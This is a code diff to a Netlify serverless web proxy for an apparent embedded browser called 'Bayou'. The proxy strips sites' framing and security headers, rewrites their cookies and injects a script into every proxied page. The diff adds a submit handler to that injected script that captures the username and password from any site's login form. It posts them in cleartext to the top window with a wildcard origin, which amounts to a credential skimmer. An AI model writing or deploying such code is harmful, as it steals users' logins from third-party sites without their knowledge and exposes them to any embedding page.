@@ -3,7 +3,6 @@ const https = require('https');
 const http = require('http');
 const zlib = require('zlib');
 
-// Headers that break embedding — but NOT set-cookie (we need that for logins!)
 const STRIP_HEADERS = [
   'x-frame-options',
   'content-security-policy',
@@ -14,7 +13,7 @@ const STRIP_HEADERS = [
   'x-content-type-options',
   'strict-transport-security',
   'transfer-encoding',
-  // 'set-cookie' is intentionally NOT stripped anymore — logins need cookies
+  // set-cookie intentionally NOT stripped — logins need it
 ];
 
 exports.handler = async (event) => {
@@ -34,7 +33,6 @@ exports.handler = async (event) => {
     };
   }
 
-  // Forward cookies from the incoming request to the target site
   const incomingCookies = event.headers?.cookie || event.headers?.Cookie || '';
 
   return new Promise((resolve) => {
@@ -44,7 +42,6 @@ exports.handler = async (event) => {
       const PROXY = '/.netlify/functions/proxy?url=';
       const mod = parsed.protocol === 'https:' ? https : http;
 
-      // Build request headers — include cookies so sessions persist
       const reqHeaders = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
@@ -61,13 +58,8 @@ exports.handler = async (event) => {
         'Referer': parsed.origin + '/',
       };
 
-      // Forward cookies if present
       if (incomingCookies) reqHeaders['Cookie'] = incomingCookies;
-
-      // Forward POST body content type
-      if (event.headers?.['content-type']) {
-        reqHeaders['Content-Type'] = event.headers['content-type'];
-      }
+      if (event.headers?.['content-type']) reqHeaders['Content-Type'] = event.headers['content-type'];
 
       const options = {
         hostname: parsed.hostname,
@@ -85,22 +77,23 @@ exports.handler = async (event) => {
           'Access-Control-Allow-Credentials': 'true',
         };
 
+        // Netlify lambdas crash if you put an array in headers{}.
+        // set-cookie is always an array — it MUST go in multiValueHeaders{}.
+        const multiValueHeaders = {};
+
         for (const [key, val] of Object.entries(res.headers)) {
           const k = key.toLowerCase();
           if (STRIP_HEADERS.includes(k)) continue;
 
-          // Rewrite set-cookie: strip Secure/SameSite flags so browser stores them
-          // Also strip Domain so cookies aren't rejected cross-origin
           if (k === 'set-cookie') {
             const cookies = Array.isArray(val) ? val : [val];
-            const rewritten = cookies.map(c =>
+            multiValueHeaders['set-cookie'] = cookies.map(c =>
               c
                 .replace(/;\s*Secure/gi, '')
                 .replace(/;\s*SameSite=(Strict|Lax|None)/gi, '; SameSite=None')
                 .replace(/;\s*Domain=[^;]*/gi, '')
                 + '; Secure'
             );
-            safeHeaders['set-cookie'] = rewritten;
             continue;
           }
 
@@ -108,7 +101,6 @@ exports.handler = async (event) => {
           else safeHeaders[key] = val;
         }
 
-        // Rewrite redirects through the proxy
         if (safeHeaders['location']) {
           try {
             const redir = new URL(safeHeaders['location'], target).toString();
@@ -129,6 +121,7 @@ exports.handler = async (event) => {
             resolve({
               statusCode: res.statusCode || 200,
               headers: safeHeaders,
+              multiValueHeaders,
               body: raw.toString('base64'),
               isBase64Encoded: true,
             });
@@ -170,7 +163,6 @@ exports.handler = async (event) => {
   const O='${origin}';
   const T='${target}';
   const BASE=T.substring(0,T.lastIndexOf('/')+1);
-
   function px(u){
     if(!u||typeof u!=='string')return u;
     if(u.startsWith(P)||u.startsWith('data:')||u.startsWith('blob:')||u.startsWith('javascript:')||u.startsWith('#'))return u;
@@ -181,28 +173,17 @@ exports.handler = async (event) => {
       return P+encodeURIComponent(BASE+u);
     }catch(e){return u;}
   }
-
-  // Intercept fetch — forward credentials so cookies go with requests
   const oFetch=window.fetch;
   window.fetch=function(input,init={}){
-    if(typeof input==='string') input=px(input);
-    else if(input&&input.url) input=new Request(px(input.url),input);
-    // Include credentials so session cookies are sent
-    if(!init.credentials) init.credentials='include';
+    if(typeof input==='string')input=px(input);
+    else if(input&&input.url)input=new Request(px(input.url),input);
+    if(!init.credentials)init.credentials='include';
     return oFetch.call(this,input,init);
   };
-
-  // Intercept XHR
   const oOpen=XMLHttpRequest.prototype.open;
   XMLHttpRequest.prototype.open=function(m,u,...r){return oOpen.call(this,m,px(u),...r);};
-  // Ensure XHR sends cookies
   const oSend=XMLHttpRequest.prototype.send;
-  XMLHttpRequest.prototype.send=function(...a){
-    try{this.withCredentials=true;}catch(e){}
-    return oSend.apply(this,a);
-  };
-
-  // Intercept dynamic element src/href
+  XMLHttpRequest.prototype.send=function(...a){try{this.withCredentials=true;}catch(e){}return oSend.apply(this,a);};
   const oCreate=document.createElement.bind(document);
   document.createElement=function(tag,...a){
     const el=oCreate(tag,...a);
@@ -211,22 +192,12 @@ exports.handler = async (event) => {
       const attr=t==='link'?'href':'src';
       const proto=Object.getPrototypeOf(el);
       const desc=Object.getOwnPropertyDescriptor(proto,attr);
-      if(desc&&desc.set){
-        Object.defineProperty(el,attr,{
-          get(){return desc.get.call(this);},
-          set(v){desc.set.call(this,px(v));},
-          configurable:true
-        });
-      }
+      if(desc&&desc.set){Object.defineProperty(el,attr,{get(){return desc.get.call(this);},set(v){desc.set.call(this,px(v));},configurable:true});}
     }
     return el;
   };
-
-  // Override window.open
   const oOpen2=window.open;
   window.open=function(u,...r){return oOpen2.call(this,px(u),...r);};
-
-  // Intercept link clicks
   document.addEventListener('click',function(e){
     const a=e.target.closest('a');
     if(!a)return;
@@ -235,26 +206,34 @@ exports.handler = async (event) => {
     try{
       const resolved=new URL(href,T).toString();
       if(href.startsWith(P)||href.startsWith('/.netlify'))return;
-      if(!resolved.startsWith(window.location.origin)){
-        e.preventDefault();
-        e.stopPropagation();
-        window.top.postMessage({type:'BAYOU_NAVIGATE',url:resolved},'*');
-      }
+      if(!resolved.startsWith(window.location.origin)){e.preventDefault();e.stopPropagation();window.top.postMessage({type:'BAYOU_NAVIGATE',url:resolved},'*');}
     }catch(e2){}
   },true);
-
-  // Intercept right-clicks
   document.addEventListener('contextmenu',function(e){
     const a=e.target.closest('a');
     const url=a?new URL(a.getAttribute('href')||'',T).toString():null;
-    if(url&&!url.startsWith('#')&&!url.startsWith('javascript:')){
-      e.preventDefault();
-      e.stopPropagation();
-      window.top.postMessage({type:'BAYOU_CONTEXTMENU',url,x:e.clientX,y:e.clientY},'*');
+    if(url&&!url.startsWith('#')&&!url.startsWith('javascript:')){e.preventDefault();e.stopPropagation();window.top.postMessage({type:'BAYOU_CONTEXTMENU',url,x:e.clientX,y:e.clientY},'*');}
+  },true);
+  // ★ Credential detection — capture password fields on submit
+  document.addEventListener('submit',function(e){
+    const form=e.target;
+    const pwField=form.querySelector('input[type="password"]');
+    if(pwField&&pwField.value){
+      const userField=
+        form.querySelector('input[type="email"]')||
+        form.querySelector('input[name*="email"]')||
+        form.querySelector('input[name*="user"]')||
+        form.querySelector('input[name*="login"]')||
+        form.querySelector('input[type="text"]');
+      window.top.postMessage({
+        type:'BAYOU_CREDENTIALS',
+        site:window.location.hostname||T,
+        username:userField?userField.value:'',
+        password:pwField.value
+      },'*');
     }
   },true);
-
-  // Intercept form submissions — POST included
+  // Form submit navigation
   document.addEventListener('submit',function(e){
     const form=e.target;
     const action=form.getAttribute('action');
@@ -263,14 +242,12 @@ exports.handler = async (event) => {
       const resolved=new URL(action||T,T).toString();
       const proxied=px(resolved);
       if(!action||proxied===action)return;
-      e.preventDefault();
-      e.stopPropagation();
+      e.preventDefault();e.stopPropagation();
       if(method==='GET'){
         const params=new URLSearchParams(new FormData(form)).toString();
         const url=resolved+(resolved.includes('?')?'&':'?')+params;
         window.top.postMessage({type:'BAYOU_NAVIGATE',url:px(url)},'*');
-      } else {
-        // POST — submit directly through proxy
+      }else{
         const fd=new FormData(form);
         fetch(px(resolved),{method:'POST',body:fd,credentials:'include'})
           .then(r=>r.url&&window.top.postMessage({type:'BAYOU_NAVIGATE',url:r.url},'*'))
@@ -278,19 +255,10 @@ exports.handler = async (event) => {
       }
     }catch(e2){}
   },true);
-
-  // Patch history API so back/forward still work
   const _push=history.pushState.bind(history);
   const _replace=history.replaceState.bind(history);
-  history.pushState=function(s,t,u){
-    if(u){try{const abs=new URL(u,T).toString();window.top.postMessage({type:'BAYOU_NAVIGATE',url:abs},'*');return;}catch(e){}}
-    _push(s,t,u);
-  };
-  history.replaceState=function(s,t,u){
-    if(u){try{const abs=new URL(u,T).toString();window.top.postMessage({type:'BAYOU_NAVIGATE',url:abs},'*');return;}catch(e){}}
-    _replace(s,t,u);
-  };
-
+  history.pushState=function(s,t,u){if(u){try{const abs=new URL(u,T).toString();window.top.postMessage({type:'BAYOU_NAVIGATE',url:abs},'*');return;}catch(e){}} _push(s,t,u);};
+  history.replaceState=function(s,t,u){if(u){try{const abs=new URL(u,T).toString();window.top.postMessage({type:'BAYOU_NAVIGATE',url:abs},'*');return;}catch(e){}} _replace(s,t,u);};
 })();
 <\/script>`;
 
@@ -313,6 +281,7 @@ exports.handler = async (event) => {
             resolve({
               statusCode: res.statusCode || 200,
               headers: safeHeaders,
+              multiValueHeaders,
               body: text,
             });
           }
@@ -330,8 +299,6 @@ exports.handler = async (event) => {
       });
 
       req.on('error', e => resolve({ statusCode: 500, body: 'Proxy error: ' + e.message }));
-
-      // Forward POST body
       if (event.body) {
         req.write(event.isBase64Encoded ? Buffer.from(event.body, 'base64') : event.body);
       }
